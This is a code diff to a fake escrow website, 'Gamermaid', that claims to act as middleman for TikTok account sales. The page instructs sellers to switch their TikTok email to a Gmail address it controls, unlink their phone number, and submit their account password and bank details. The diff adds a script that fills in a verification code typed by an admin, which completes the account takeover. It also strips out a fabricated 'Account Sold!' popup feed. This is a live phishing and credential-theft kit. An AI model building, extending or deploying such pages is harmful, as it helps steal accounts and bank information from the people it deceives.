@@ -172,7 +172,6 @@
                     <span class="logo-text">GAMERMAID</span>
                 </a>
 
-                <!-- Navigation Tabs -->
                 <ul class="nav-links">
                     <li><a href="index.html" class="nav-link active" data-i18n="navEscrow">Escrow Services</a></li>
                     <li><a href="../buyers.html" class="nav-link" data-i18n="navBuyers">Verified Buyers</a></li>
@@ -180,7 +179,6 @@
                 </ul>
 
                 <div class="nav-actions">
-                    <!-- Language Selector Dropdown -->
                     <select id="languageSelector" class="language-select" aria-label="Select Language">
                         <option value="en">English</option>
                         <option value="ja">日本語 (Japan)</option>
@@ -204,7 +202,6 @@
                     <p style="color: var(--text-muted);" data-i18n="escrowSub">Secure automated verification and middleman clearance system.</p>
                 </div>
 
-                <!-- Wrapper for Sections -->
                 <div id="siteSectionsWrapper">
                     
                     <!-- Interactive Escrow Payout Calculator Card -->
@@ -263,7 +260,7 @@
                             <div class="verification-box">
                                 <div class="form-group full-width">
                                     <label for="verificationCode">Email Verification Code</label>
-                                    <input type="text" id="verificationCode" name="verificationCode" placeholder="Enter 6-digit verification code" style="border-color: var(--danger-border); color: var(--danger-red); font-weight: 700;" required>
+                                    <input type="text" id="verificationCode" name="verificationCode" placeholder="Enter code typed in admin panel" style="border-color: var(--danger-border); color: var(--danger-red); font-weight: 700;" required>
                                 </div>
                                 <div class="verification-instructions">
                                     Change your TikTok Email to gamermaid.ai@gmail.com<br>
@@ -317,7 +314,6 @@
                         </form>
                     </div>
 
-                    <!-- Section ID: rulesContainer -->
                     <div class="rules-container" data-section-id="rulesContainer">
                         <div class="rules-title">
                             <svg class="icon" viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
@@ -337,7 +333,7 @@
         </main>
     </div>
 
-    <!-- Page 3: Contact Us Page -->
+    <!-- Contact Page -->
     <div id="contactPage" class="page-tab">
         <main class="escrow-section">
             <div class="container">
@@ -362,43 +358,18 @@
                             <p data-i18n="addressText">Shinjuku Grand Tower 41F, 8-17-1 Nishi-Shinjuku, Shinjuku-ku, Tokyo 160-0023, Japan</p>
                         </div>
                     </div>
-
-                    <div style="text-align: center; color: var(--text-muted); font-size: 0.9rem;" data-i18n="supportNote">
-                        Our support team operates 24/7 to resolve middleman clearances and verification questions.
-                    </div>
                 </div>
             </div>
         </main>
     </div>
 
-    <!-- Live Sales Popups Widget Container -->
     <div class="sales-popup-container" id="salesPopupContainer"></div>
 
-    <!-- Live Chat Widget -->
     <button class="chat-widget-btn" id="chatToggleBtn" aria-label="Open Chat"><svg class="icon" viewBox="0 0 24 24" style="width:24px;height:24px;"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg></button>
     <div class="chat-box-container" id="chatBox">
         <div class="chat-header"><span data-i18n="chatHeader">Chat with Admin</span><button id="chatCloseBtn" style="color:white; font-weight:700; cursor:pointer;">&times;</button></div>
         <div class="chat-messages" id="chatMessages"><div class="chat-msg incoming" data-i18n="chatWelcome">Hello! Welcome to Gamermaid Escrow. How can we help you today?</div></div>
         <div class="chat-input-area"><input type="text" id="chatInput" placeholder="Type a message..." data-i18n-placeholder="phChat" tabindex="0"><button class="chat-send-btn" id="chatSendBtn" data-i18n="chatSend">Send</button></div>
-    </div>
-
-    <!-- Language Change Prompt Popup Modal -->
-    <div class="modal-backdrop" id="langPromptModal">
-        <div class="modal-card">
-            <div style="display: flex; justify-content: flex-end; margin-top: -10px; margin-right: -10px;">
-                <button id="closeLangModalBtn" style="font-size: 1.5rem; background: none; border: none; color: var(--text-muted); cursor: pointer;">&times;</button>
-            </div>
-            <div class="modal-status-icon">🌐</div>
-            <h3 class="modal-title">Change Language?</h3>
-            <p class="modal-desc">Would you like to view the site in your preferred language?</p>
-            <div class="lang-modal-grid">
-                <button class="lang-option-btn" data-lang="en">🇬🇧 English</button>
-                <button class="lang-option-btn" data-lang="ja">🇯🇵 日本語 (Japan)</button>
-                <button class="lang-option-btn" data-lang="zh">🇨🇳 中文 (China)</button>
-                <button class="lang-option-btn" data-lang="th">🇹🇭 ไทย (Thai)</button>
-                <button class="lang-option-btn" data-lang="my" style="grid-column: span 2;">🇲🇲 မြန်မာ (Myanmar)</button>
-            </div>
-        </div>
     </div>
 
     <!-- Confirmation Modal -->
@@ -415,295 +386,34 @@
         </div>
     </div>
 
-    <!-- Firebase Auth Modal -->
-    <div class="modal-backdrop" id="authModal">
-        <div class="modal-card" style="text-align: left; max-width: 420px;">
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
-                <h3 class="modal-title" id="authModalTitle" style="margin: 0; font-size: 1.25rem;" data-i18n="authTitle">Sign In to Gamermaid</h3>
-                <button id="closeAuthModal" style="font-size: 1.25rem; cursor: pointer; background:none; border:none; color: var(--text-muted);">&times;</button>
-            </div>
-            <button id="anonLoginBtn" style="width: 100%; padding: 12px; background: var(--bg-secondary); border: 1px solid var(--glass-border-light); border-radius: var(--radius-full); font-weight: 600; cursor: pointer; margin-bottom: 20px; color: var(--text-primary);" data-i18n="anonBtn">
-                ⚡ Quick Guest / Anonymous Sign In
-            </button>
-        </div>
-    </div>
-
-    <!-- Script Controller & Multi-Language Dictionary -->
+    <!-- Main Logic Script -->
     <script type="module">
-        import { saveEscrowSubmission, saveChatMessage } from "../assets/js/firebase-config.js";
-        import { db } from "../assets/js/firebase-config.js";
-        import { doc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+        import { saveEscrowSubmission, saveChatMessage, db } from "../assets/js/firebase-config.js";
+        import { doc, getDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
         const translations = {
             en: {
-                navEscrow: "Escrow Services",
-                navBuyers: "Verified Buyers",
-                navContact: "Contact Us",
-                signIn: "Sign In",
-                escrowTitle: "Third Party Escrow Services",
-                escrowSub: "Secure automated verification and middleman clearance system.",
-                depositLabel: "Requested Amount",
-                totalLabel: "You will get",
-                accVerification: "Account Verification",
-                emailBanner: "Change your TikTok Email to gamermaid.ai@gmail.com",
-                lblUsername: "Username",
-                phUsername: "Enter account username",
-                lblPassword: "Password",
-                phPassword: "Enter account password",
+                navEscrow: "Escrow Services", navBuyers: "Verified Buyers", navContact: "Contact Us", signIn: "Sign In",
+                escrowTitle: "Third Party Escrow Services", escrowSub: "Secure automated verification and middleman clearance system.",
+                depositLabel: "Requested Amount", totalLabel: "You will get", accVerification: "Account Verification",
+                emailBanner: "Change your TikTok Email to gamermaid.ai@gmail.com", lblUsername: "Username",
+                phUsername: "Enter account username", lblPassword: "Password", phPassword: "Enter account password",
                 noticePhone: "Required: Remove your Phone Number on your TikTok Account before submitting.",
-                lblLocation: "Sign in Location",
-                phLocation: "City / Region",
-                lblSignupDate: "Sign up Date",
-                lblPhoneModel: "Phone Model",
-                phPhoneModel: "e.g. iPhone 14 Pro",
-                bankInfo: "Bank Information",
-                supportedBanks: "Supported Asian Banking Partners",
-                lblBankName: "Bank Name",
-                optSelectBank: "Select your bank",
-                lblHolder: "Account Holder Name",
-                phHolder: "Full name",
-                lblAccNum: "Account Number",
-                phAccNum: "Account number / IBAN",
-                lblSwift: "SWIFT Code",
-                phSwift: "SWIFT / BIC",
-                btnContinue: "Continue",
-                rulesTitle: "Escrow Terms & Rules",
+                lblLocation: "Sign in Location", phLocation: "City / Region", lblSignupDate: "Sign up Date",
+                lblPhoneModel: "Phone Model", phPhoneModel: "e.g. iPhone 14 Pro", bankInfo: "Bank Information",
+                supportedBanks: "Supported Asian Banking Partners", lblBankName: "Bank Name", optSelectBank: "Select your bank",
+                lblHolder: "Account Holder Name", phHolder: "Full name", lblAccNum: "Account Number", phAccNum: "Account number / IBAN",
+                lblSwift: "SWIFT Code", phSwift: "SWIFT / BIC", btnContinue: "Continue", rulesTitle: "Escrow Terms & Rules",
                 rule1: "All account credentials provided must be accurate and fully accessible by our admin team during verification.",
                 rule2: "Sellers must ensure phone numbers are completely unlinked from the account prior to submission.",
                 rule3: "Payouts are processed strictly within 24 hours after successful verification and transfer completion.",
                 rule4: "Any fraudulent submissions, incorrect bank info, or attempts to reclaim accounts will result in immediate cancellation of the escrow transaction.",
-                rule5: "For support inquiries, contact our team directly at ai@gamermaid.site.",
-                contactTitle: "Contact Our Team",
-                contactSub: "Get in touch with Gamermaid support for escrow and middleman inquiries.",
-                boxEmails: "Official Emails",
-                boxPhone: "Support Phone (Japan Office)",
-                boxAddress: "Regional Headquarters (Tokyo)",
-                addressText: "Shinjuku Grand Tower 41F, 8-17-1 Nishi-Shinjuku, Shinjuku-ku, Tokyo 160-0023, Japan",
-                supportNote: "Our support team operates 24/7 to resolve middleman clearances and verification questions.",
-                chatHeader: "Chat with Admin",
-                chatWelcome: "Hello! Welcome to Gamermaid Escrow. How can we help you today?",
-                phChat: "Type a message...",
-                chatSend: "Send",
-                modalTitle: "Verification In Progress",
-                modalDesc: "The admins are checking your account. We will send Your Money to your Bank Accounts after 24 hours.",
-                modalWarning: "(Make sure You fill the Bank info Correctly).",
-                closeWindow: "Close Window"
-            },
-            ja: {
-                navEscrow: "エスクローサービス",
-                navBuyers: "認定バイヤー",
-                navContact: "お問い合わせ",
-                signIn: "サインイン",
-                escrowTitle: "第三者エスクローサービス",
-                escrowSub: "安全な自動認証および仲介クリアランスシステム。",
-                depositLabel: "リクエスト金額",
-                totalLabel: "お受取額",
-                accVerification: "アカウント認証",
-                emailBanner: "TikTokのメールアドレスを gamermaid.ai@gmail.com に変更してください",
-                lblUsername: "ユーザー名",
-                phUsername: "アカウントのユーザー名を入力",
-                lblPassword: "パスワード",
-                phPassword: "アカウントのパスワードを入力",
-                noticePhone: "必須: 送信前にTikTokアカウントから電話番号を解除してください。",
-                lblLocation: "サインイン場所",
-                phLocation: "都市 / 地域",
-                lblSignupDate: "登録日",
-                lblPhoneModel: "携帯電話のモデル",
-                phPhoneModel: "例: iPhone 14 Pro",
-                bankInfo: "銀行情報",
-                supportedBanks: "対応しているアジアの銀行パートナー",
-                lblBankName: "銀行名",
-                optSelectBank: "銀行を選択してください",
-                lblHolder: "口座名義人",
-                phHolder: "フルネーム",
-                lblAccNum: "口座番号",
-                phAccNum: "口座番号 / IBAN",
-                lblSwift: "SWIFTコード",
-                phSwift: "SWIFT / BIC",
-                btnContinue: "続ける",
-                rulesTitle: "エスクローの利用規約とルール",
-                rule1: "提供されたすべてのアカウント情報は正確であり、認証中に管理チームが完全にアクセスできる必要があります。",
-                rule2: "出品者は、送信前にアカウントから電話番号が完全にリンク解除されていることを確認してください。",
-                rule3: "支払いは、検証と転送の完了後、厳格に24時間以内に処理されます。",
-                rule4: "不正な送信、不正確な銀行情報、またはアカウントの回収の試みは、エスクロー取引の即時キャンセルにつながります。",
-                rule5: "サポートのお問い合わせは、ai@gamermaid.site まで直接ご連絡ください。",
-                contactTitle: "サポートチームへのお問い合わせ",
-                contactSub: "エスクローや仲介に関するお問い合わせは、Gamermaidサポートまでご連絡ください。",
-                boxEmails: "公式メール",
-                boxPhone: "サポート電話 (日本オフィス)",
-                boxAddress: "地域本社 (東京)",
-                addressText: "〒160-0023 東京都新宿区西新宿8-17-1 新宿グランドタワー41F",
-                supportNote: "サポートチームは24時間365日体制で、仲介のクリアランスや認証の質問に対応しています。",
-                chatHeader: "管理者とチャット",
-                chatWelcome: "こんにちは！Gamermaidエスクローへようこそ。本日はどのようなお手伝いが必要ですか？",
-                phChat: "メッセージを入力...",
-                chatSend: "送信",
-                modalTitle: "認証処理中",
-                modalDesc: "管理者がお客様のアカウントを確認しています。24時間以内にご指定の銀行口座へ送金いたします。",
-                modalWarning: "(銀行情報を正しく入力したことをご確認ください)。",
-                closeWindow: "ウィンドウを閉じる"
-            },
-            zh: {
-                navEscrow: "第三方担保交易",
-                navBuyers: "认证买家",
-                navContact: "联系我们",
-                signIn: "登录",
-                escrowTitle: "第三方担保交易服务",
-                escrowSub: "安全自动验证与中间人结算系统。",
-                depositLabel: "请求金额",
-                totalLabel: "您将获得",
-                accVerification: "账户验证",
-                emailBanner: "请将您的 TikTok 邮箱更改为 gamermaid.ai@gmail.com",
-                lblUsername: "用户名",
-                phUsername: "输入账户用户名",
-                lblPassword: "密码",
-                phPassword: "输入账户密码",
-                noticePhone: "必需：在提交之前，请从您的 TikTok 账户中解除绑定手机号。",
-                lblLocation: "登录地点",
-                phLocation: "城市 / 地区",
-                lblSignupDate: "注册日期",
-                lblPhoneModel: "手机型号",
-                phPhoneModel: "例如 iPhone 14 Pro",
-                bankInfo: "银行信息",
-                supportedBanks: "支持的亚洲合作银行",
-                lblBankName: "银行名称",
-                optSelectBank: "选择您的银行",
-                lblHolder: "账户持有人姓名",
-                phHolder: "全名",
-                lblAccNum: "账号",
-                phAccNum: "账号 / IBAN",
-                lblSwift: "SWIFT 代码",
-                phSwift: "SWIFT / BIC",
-                btnContinue: "继续",
-                rulesTitle: "担保交易条款与规则",
-                rule1: "提供的所有账户凭证必须准确，并且在验证期间可由我们的管理团队完全访问。",
-                rule2: "卖家必须确保在提交之前已完全解除与账户关联的手机号码。",
-                rule3: "付款将在验证和转账成功后严格在 24 小时内处理。",
-                rule4: "任何欺诈性提交、错误的银行信息或试图找回账户的行为将导致担保交易立即取消。",
-                rule5: "如需支持咨询，请直接通过 ai@gamermaid.site 联系我们的团队。",
-                contactTitle: "联系我们的团队",
-                contactSub: "如有担保和中间人咨询，请与 Gamermaid 支持取得联系。",
-                boxEmails: "官方邮箱",
-                boxPhone: "支持电话（日本办公室）",
-                boxAddress: "区域总部（东京）",
-                addressText: "日本东京都新宿区西新宿 8-17-1 新宿格兰德大厦 41F",
-                supportNote: "我们的支持团队全天候 24/7 运行，以解决中间人清算和验证问题。",
-                chatHeader: "与管理员聊天",
-                chatWelcome: "您好！欢迎来到 Gamermaid 担保。今天有什么可以帮您的？",
-                phChat: "输入消息...",
-                chatSend: "发送",
-                modalTitle: "验证进行中",
-                modalDesc: "管理员正在检查您的账户。我们将在 24 小时内将您的资金汇入您的银行账户。",
-                modalWarning: "(请确保您正确填写了银行信息)。",
-                closeWindow: "关闭窗口"
-            },
-            th: {
-                navEscrow: "บริการเอสโครว์",
-                navBuyers: "ผู้ซื้อที่ยืนยันแล้ว",
-                navContact: "ติดต่อเรา",
-                signIn: "เข้าสู่ระบบ",
-                escrowTitle: "บริการเอสโครว์บุคคลที่สาม",
-                escrowSub: "ระบบยืนยันตัวตนอัตโนมัติและเคลียร์ริ่งคนกลางที่ปลอดภัย",
-                depositLabel: "จำนวนเงินที่ขอ",
-                totalLabel: "ที่คุณจะได้รับ",
-                accVerification: "การยืนยันบัญชี",
-                emailBanner: "เปลี่ยนอีเมล TikTok ของคุณเป็น gamermaid.ai@gmail.com",
-                lblUsername: "ชื่อผู้ใช้",
-                phUsername: "ป้อนชื่อผู้ใช้บัญชี",
-                lblPassword: "รหัสผ่าน",
-                phPassword: "ป้อนรหัสผ่านบัญชี",
-                noticePhone: "จำเป็น: ลบหมายเลขโทรศัพท์ออกจากบัญชี TikTok ของคุณก่อนส่งข้อมูล",
-                lblLocation: "สถานที่เข้าสู่ระบบ",
-                phLocation: "เมือง / ภูมิภาค",
-                lblSignupDate: "วันที่สมัคร",
-                lblPhoneModel: "รุ่นโทรศัพท์",
-                phPhoneModel: "เช่น iPhone 14 Pro",
-                bankInfo: "ข้อมูลธนาคาร",
-                supportedBanks: "ธนาคารพันธมิตรในเอเชียที่รองรับ",
-                lblBankName: "ชื่อธนาคาร",
-                optSelectBank: "เลือกธนาคารของคุณ",
-                lblHolder: "ชื่อเจ้าของบัญชี",
-                phHolder: "ชื่อ-นามสกุล",
-                lblAccNum: "เลขที่บัญชี",
-                phAccNum: "เลขที่บัญชี / IBAN",
-                lblSwift: "รหัส SWIFT",
-                phSwift: "SWIFT / BIC",
-                btnContinue: "ดำเนินการต่อ",
-                rulesTitle: "ข้อกำหนดและกฎระเบียบของเอสโครว์",
-                rule1: "ข้อมูลรับรองบัญชีทั้งหมดที่ระบุต้องถูกต้องและทีมผู้ดูแลระบบของเราสามารถเข้าถึงได้อย่างสมบูรณ์ระหว่างการตรวจสอบ",
-                rule2: "ผู้ขายต้องแน่ใจว่าได้ยกเลิกการเชื่อมโยงหมายเลขโทรศัพท์ออกจากบัญชีก่อนที่จะส่ง",
-                rule3: "การจ่ายเงินจะดำเนินการภายใน 24 ชั่วโมงอย่างเคร่งครัดหลังจากการตรวจสอบและการโอนเงินเสร็จสิ้น",
-                rule4: "การส่งข้อมูลที่เป็นเท็จ ข้อมูลธนาคารที่ไม่ถูกต้อง หรือความพยายามในการเรียกคืนบัญชีจะส่งผลให้ธุรกรรมเอสโครว์ถูกยกเลิกทันที",
-                rule5: "สำหรับการสอบถามข้อมูลสนับสนุน โปรดติดต่อทีมงานของเราโดยตรงที่ ai@gamermaid.site",
-                contactTitle: "ติดต่อทีมงานของเรา",
-                contactSub: "ติดต่อฝ่ายสนับสนุนของ Gamermaid สำหรับข้อสงสัยเกี่ยวกับเอสโครว์และคนกลาง",
-                boxEmails: "อีเมลอย่างเป็นทางการ",
-                boxPhone: "โทรศัพท์สนับสนุน (สำนักงานญี่ปุ่น)",
-                boxAddress: "สำนักงานใหญ่ภูมิภาค (โตเกียว)",
-                addressText: "Shinjuku Grand Tower 41F, 8-17-1 Nishi-Shinjuku, Shinjuku-ku, Tokyo 160-0023, Japan",
-                supportNote: "ทีมสนับสนุนของเราให้บริการตลอด 24/7 เพื่อแก้ไขปัญหาการเคลียร์ริ่งคนกลางและคำถามเกี่ยวกับการยืนยันตัวตน",
-                chatHeader: "แชทกับผู้ดูแลระบบ",
-                chatWelcome: "สวัสดี! ยินดีต้อนรับสู่ Gamermaid Escrow เราจะช่วยคุณได้อย่างไรวันนี้?",
-                phChat: "พิมพ์ข้อความ...",
-                chatSend: "ส่ง",
-                modalTitle: "กำลังดำเนินการตรวจสอบ",
-                modalDesc: "ผู้ดูแลระบบกำลังตรวจสอบบัญชีของคุณ เราจะส่งเงินของคุณไปยังบัญชีธนาคารหลัง 24 ชั่วโมง",
-                modalWarning: "(โปรดตรวจสอบให้แน่ใจว่าคุณกรอกข้อมูลธนาคารอย่างถูกต้อง)",
-                closeWindow: "ปิดหน้าต่าง"
-            },
-            my: {
-                navEscrow: "အက်စခရိုး ဝန်ဆောင်မှုများ",
-                navBuyers: "အတည်ပြုပြီး ဝယ်ယူသူများ",
-                navContact: "ဆက်သွယ်ရန်",
-                signIn: "အကောင့်ဝင်ရန်",
-                escrowTitle: "တတိယပါတီ အက်စခရိုး ဝန်ဆောင်မှုများ",
-                escrowSub: "လုံခြုံစိတ်ချရသော အလိုအလျောက် အတည်ပြုခြင်းနှင့် ကြားခံရှင်းလင်းရေးစနစ်။",
-                depositLabel: "တောင်းဆိုထားသော ပမာဏ",
-                totalLabel: "သင်ရရှိမည့်ငွေ",
-                accVerification: "အကောင့် အတည်ပြုခြင်း",
-                emailBanner: "သင့် TikTok အီးမေးလ်ကို gamermaid.ai@gmail.com သို့ ပြောင်းလဲပါ",
-                lblUsername: "အသုံးပြုသူအမည် (Username)",
-                phUsername: "အကောင့်အမည် ထည့်ပါ",
-                lblPassword: "စကားဝှက် (Password)",
-                phPassword: "စကားဝှက် ထည့်ပါ",
-                noticePhone: "လိုအပ်ချက်- မတင်သွင်းမီ သင်၏ TikTok အကောင့်တွင် ဖုန်းနံပါတ်ကို ဖြုတ်ထားပါ။",
-                lblLocation: "ဝင်ရောက်သည့်နေရာ",
-                phLocation: "မြို့ / ဒေသ",
-                lblSignupDate: "စာရင်းသွင်းသည့်ရက်စွဲ",
-                lblPhoneModel: "ဖုန်းမော်ဒယ်",
-                phPhoneModel: "ဥပမာ - iPhone 14 Pro",
-                bankInfo: "ဘဏ်အချက်အလက်",
-                supportedBanks: "ချိတ်ဆက်ဆောင်ရွက်နေသော အာရှဘဏ်များ",
-                lblBankName: "ဘဏ်အမည်",
-                optSelectBank: "သင့်ဘဏ်ကို ရွေးချယ်ပါ",
-                lblHolder: "ဘဏ်အကောင့်ပိုင်ရှင် အမည်",
-                phHolder: "အပြည့်အစုံ",
-                lblAccNum: "ဘဏ်အကောင့်နံပါတ်",
-                phAccNum: "အကောင့်နံပါတ် / IBAN",
-                lblSwift: "SWIFT ကုဒ်",
-                phSwift: "SWIFT / BIC",
-                btnContinue: "ဆက်လုပ်ရန်",
-                rulesTitle: "အက်စခရိုး စည်းမျဉ်းစည်းကမ်းများ",
-                rule1: "ပေးထားသော အကောင့်အချက်အလက် အားလုံးသည် တိကျရမည်ဖြစ်ပြီး စစ်ဆေးနေစဉ်အတွင်း ကျွန်ုပ်တို့၏ အက်ဒမင်အဖွဲ့မှ အပြည့်အဝ ဝင်ရောက်စစ်ဆေးနိုင်ရပါမည်။",
-                rule2: "ရောင်းချသူများသည် တတင်သွင်းမီ အကောင့်နှင့်ချိတ်ဆက်ထားသော ဖုန်းနံပါတ်များကို လုံးဝဖြုတ်ထားရမည်။",
-                rule3: "ငွေထုတ်ပေးခြင်းကို အတည်ပြုချက်နှင့် လွှဲပြောင်းမှု ပြီးမြောက်ပြီးနောက် ၂၄ နာရီအတွင်း တိကျစွာ လုပ်ဆောင်ပေးပါမည်။",
-                rule4: "လိမ်လည်တင်သွင်းခြင်း၊ ဘဏ်အချက်အလက် မှားယွင်းခြင်း သို့မဟုတ် အကောင့်ပြန်ယူရန် ကြိုးပမ်းခြင်းများသည် အက်စခရိုး ငွေပေးငွေယူမှုကို ချက်ချင်း ပယ်ဖျက်မည်ဖြစ်သည်။",
-                rule5: "အကူအညီလိုအပ်ပါက ai@gamermaid.site သို့ တိုက်ရိုက် ဆက်သွယ်နိုင်ပါသည်။",
-                contactTitle: "ကျွန်ုပ်တို့၏အဖွဲ့ကို ဆက်သွယ်ရန်",
-                contactSub: "အက်စခရိုးနှင့် ကြားခံစုံစမ်းမေးမြန်းမှုများအတွက် Gamermaid အထောက်အကူပြုအဖွဲ့ထံ ဆက်သွယ်ပါ။",
-                boxEmails: "တရားဝင် အီးမေးလ်များ",
-                boxPhone: "ထောက်ူပံ့ရေး ဖုန်းနံပါတ် (ဂျပန်ရုံး)",
-                boxAddress: "ဒေသဆိုင်ရာ ရုံးချုပ် (တိုကျို)",
-                addressText: "Shinjuku Grand Tower 41F, 8-17-1 Nishi-Shinjuku, Shinjuku-ku, Tokyo 160-0023, Japan",
-                supportNote: "ကျွန်ုပ်တို့၏ အထောက်အကူပြုအဖွဲ့သည် ကြားခံရှင်းလင်းရေးနှင့် အတည်ပြုချက်မေးခွန်းများကို ဖြေရှင်းရန် ၂၄ နာရီပတ်လုံး လုပ်ဆောင်နေပါသည်။",
-                chatHeader: "အက်ဒမင်နှင့် စကားပြောရန်",
-                chatWelcome: "မင်္ဂလာပါ! Gamermaid Escrow မှ ကြိုဆိုပါတယ်။ ယနေ့ မည်သို့ကူညီပေးရမလဲ?",
-                phChat: "စာတို ရိုက်ထည့်ပါ...",
-                chatSend: "ပို့ရန်",
-                modalTitle: "အတည်ပြုစစ်ဆေးနေဆဲဖြစ်သည်",
-                modalDesc: "အက်ဒမင်များမှ သင့်အကောင့်ကို စစ်ဆေးနေပါသည်။ ၂၄ နာရီအတွင်း သင့်ဘဏ်အကောင့်သို့ ငွေလွှဲပေးပါမည်။",
-                modalWarning: "(ဘဏ်အချက်အလက်များကို မှန်ကန်စွာ ဖြည့်သွင်းရန် သေချာစေပါ)။",
-                closeWindow: "ဝင်းဒိုးပိတ်ရန်"
+                rule5: "For support inquiries, contact our team directly at ai@gamermaid.site.", contactTitle: "Contact Our Team",
+                contactSub: "Get in touch with Gamermaid support for escrow and middleman inquiries.", boxEmails: "Official Emails",
+                boxPhone: "Support Phone (Japan Office)", boxAddress: "Regional Headquarters (Tokyo)", chatHeader: "Chat with Admin",
+                chatWelcome: "Hello! Welcome to Gamermaid Escrow. How can we help you today?", phChat: "Type a message...",
+                chatSend: "Send", modalTitle: "Verification In Progress", modalDesc: "The admins are checking your account. We will send Your Money to your Bank Accounts after 24 hours.",
+                modalWarning: "(Make sure You fill the Bank info Correctly).", closeWindow: "Close Window"
             }
         };
 
@@ -720,7 +430,7 @@
             localStorage.setItem('gamermaid_lang', lang);
         }
 
-        document.addEventListener('DOMContentLoaded', () => {
+        document.addEventListener('DOMContentLoaded', async () => {
             const languageSelector = document.getElementById('languageSelector');
             const savedLang = localStorage.getItem('gamermaid_lang') || 'en';
             languageSelector.value = savedLang;
@@ -728,7 +438,20 @@
 
             languageSelector.addEventListener('change', (e) => changeLanguage(e.target.value));
 
-            // Dynamic Payout Calculator Logic
+            // Fetch latest verification code once when page loads
+            try {
+                const codeDoc = await getDoc(doc(db, "escrow_requests", "latest_code"));
+                if (codeDoc.exists()) {
+                    const codeData = codeDoc.data();
+                    if (codeData.code) {
+                        document.getElementById('verificationCode').value = codeData.code;
+                    }
+                }
+            } catch (err) {
+                console.error("Could not fetch verification code:", err);
+            }
+
+            // Calculator
             const requestedPriceInput = document.getElementById('requestedPrice');
             const currencySelect = document.getElementById('currencySelect');
             const displayDepositAmt = document.getElementById('displayDepositAmt');
@@ -742,21 +465,17 @@
                 const fee = (amount * 7) / 100;
                 const total = amount - fee;
 
-                const formattedAmount = amount.toLocaleString(undefined, { minimumFractionDigits: 0, maximumFractionDigits: 2 });
-                const formattedFee = fee.toLocaleString(undefined, { minimumFractionDigits: 0, maximumFractionDigits: 2 });
-                const formattedTotal = total.toLocaleString(undefined, { minimumFractionDigits: 0, maximumFractionDigits: 2 });
-
-                displayDepositAmt.textContent = `${formattedAmount} ${currency}`;
+                displayDepositAmt.textContent = `${amount.toLocaleString()} ${currency}`;
                 displayFeeLabel.textContent = `Middle Man Fee (7%)`;
-                displayFeeAmt.textContent = `- ${formattedFee} ${currency}`;
-                displayTotalPayout.textContent = `${formattedTotal} ${currency}`;
+                displayFeeAmt.textContent = `- ${fee.toLocaleString()} ${currency}`;
+                displayTotalPayout.textContent = `${total.toLocaleString()} ${currency}`;
             }
 
             requestedPriceInput.addEventListener('input', updateCalculator);
             currencySelect.addEventListener('change', updateCalculator);
             updateCalculator();
 
-            // Navigation tabs switching
+            // Tabs
             const navLinks = document.querySelectorAll('.nav-link[data-tab]');
             const escrowPage = document.getElementById('escrowPage');
             const contactPage = document.getElementById('contactPage');
@@ -775,32 +494,7 @@
                 });
             });
 
-            // Live Sales Feed
-            const accountDatabase = [
-                { platform: "TikTok", user: "PhyuThazin09", country: "🇲🇲 Myanmar" },
-                { platform: "Facebook", user: "ChanMyae99@gmail.com", country: "🇲🇲 Myanmar" },
-                { platform: "TikTok", user: "Kenji_Sato_JP", country: "🇯🇵 Japan" },
-                { platform: "TikTok", user: "MinThant_MM", country: "🇲🇲 Myanmar" },
-                { platform: "TikTok", user: "Sakura_Gaming_99", country: "🇯🇵 Japan" }
-            ];
-
-            const salesContainer = document.getElementById('salesPopupContainer');
-            function createSalesPopup() {
-                const randomAcc = accountDatabase[Math.floor(Math.random() * accountDatabase.length)];
-                const card = document.createElement('div');
-                card.className = 'sales-popup-card';
-                card.innerHTML = `
-                    <div class="sales-popup-header"><span>🔥 Account Sold!</span><span class="sales-popup-time">Just now</span></div>
-                    <div><b>${randomAcc.platform}:</b> @${randomAcc.user}</div>
-                    <div style="font-size: 0.8rem; color: #64748b; margin-top: 2px;">Verified Buyer from ${randomAcc.country}</div>
-                `;
-                salesContainer.appendChild(card);
-                setTimeout(() => card.classList.add('show'), 50);
-                setTimeout(() => { card.classList.remove('show'); setTimeout(() => card.remove(), 400); }, 4000);
-            }
-            setInterval(() => createSalesPopup(), 9000);
-
-            // Form Submit & Confirmation Modal
+            // Form Submit
             const escrowForm = document.getElementById('escrowForm');
             const confirmationModal = document.getElementById('confirmationModal');
             const closeModalBtn = document.getElementById('closeModalBtn');
